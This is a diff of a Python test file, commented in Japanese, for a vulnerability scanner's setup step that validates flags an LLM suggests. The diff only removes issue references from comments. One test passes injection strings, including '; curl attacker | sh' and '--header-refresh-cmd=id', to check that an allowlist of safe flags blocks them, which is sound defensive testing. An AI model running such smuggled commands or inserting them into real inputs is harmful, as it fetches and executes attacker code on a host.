@@ -1,4 +1,4 @@
-"""F11: setup が LLM 応答を検証して提案へ反映し、無効応答/LLM無しは既定へ fallback する。
+"""setup が LLM 応答を検証して提案へ反映し、無効応答/LLM無しは既定へ fallback する。
 
 `main._parse_setup_llm` は純粋関数。妥当な JSON → 提案 dict、壊れた/未知のみ/空 → None
 （呼び出し側 run_setup は None のとき明示的にヒューリスティックへ倒す）。
@@ -33,8 +33,8 @@ def test_code_fenced_json_is_extracted():
 
 
 def test_check_flag_is_normalized_into_checks():
-    # 宣伝例 `--dom-xss` 等「実は check」を指すフラグは checks へ正規化し、黙って落とさない
-    # （Codex #170 P2）。known に dom_xss を含めて検証。
+    # 宣伝例 `--dom-xss` 等「実は check」を指すフラグは checks へ正規化し、黙って落とさない。
+    # known に dom_xss を含めて検証。
     known = KNOWN | {"dom_xss"}
     text = '{"checks": ["xss"], "flags": ["--dom-xss", "--headless"], "depth": 2}'
     out = _parse_setup_llm(text, known)
@@ -64,14 +64,14 @@ def test_flags_must_be_string_list():
 
 
 def test_bool_depth_rejected():
-    # True は int サブクラスだが depth に採らない（--depth True を防ぐ・#170 P2）
+    # True は int サブクラスだが depth に採らない（--depth True を防ぐ）
     out = _parse_setup_llm('{"checks": ["xss"], "depth": true}', KNOWN)
     assert out["depth"] == 2
 
 
 def test_flags_allowlist_only_safe_toggles():
     # コピー可能コマンドへ連結されるため、明示許可リスト（無害な boolean トグル）のみ通す。
-    # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
+    # 注入・値がシェル実行される option・任意の値付き option を排除。
     out = _parse_setup_llm(
         '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
         '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--fast", '
@@ -84,7 +84,7 @@ def test_flags_allowlist_only_safe_toggles():
 
 
 def test_call_llm_uses_provided_system(monkeypatch):
-    """setup は _SYSTEM_PROMPT ではなく setup 用 system を渡すこと（#170 P2）。"""
+    """setup は _SYSTEM_PROMPT ではなく setup 用 system を渡すこと。"""
     import asyncio
     import types
     import httpx
@@ -121,7 +121,7 @@ def test_call_llm_uses_provided_system(monkeypatch):
 
 
 def test_safe_setup_flags_all_exist_on_scan_parser():
-    """許可リストの flag が実在の scan オプションであることを保証する（#170 P2 の再発防止）。"""
+    """許可リストの flag が実在の scan オプションであることを保証する（再発防止）。"""
     import re
     from main import _SAFE_SETUP_FLAGS
     help_txt = subprocess.run(
